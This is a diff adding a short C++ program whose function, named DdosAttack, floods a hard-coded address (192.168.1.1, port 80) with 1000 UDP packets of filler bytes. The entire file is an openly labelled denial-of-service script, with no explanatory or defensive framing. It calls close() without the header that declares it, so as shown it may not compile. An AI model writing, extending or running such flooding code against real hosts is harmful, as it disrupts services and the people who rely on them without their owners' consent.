@@ -1,0 +1,40 @@
+#include <iostream>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <cstring>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+void DdosAttack(const std::string& target_ip, int target_port, int num_packets) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock == -1) {
+        std::cerr << "Failed to create socket" << std::endl;
+        return;
+    }
+
+    struct sockaddr_in target_addr;
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(target_port);
+    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);
+
+    char buffer[1024];
+    for (int i = 0; i < num_packets; ++i) {
+        memset(buffer, 'X', 1024);
+        sendto(sock, buffer, 1024, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+
+    close(sock);
+}
+
+int main() {
+    std::string target_ip = "192.168.1.1";
+    int target_port = 80;
+    int num_packets = 1000;
+
+    DdosAttack(target_ip, target_port, num_packets);
+    return 0;
+}
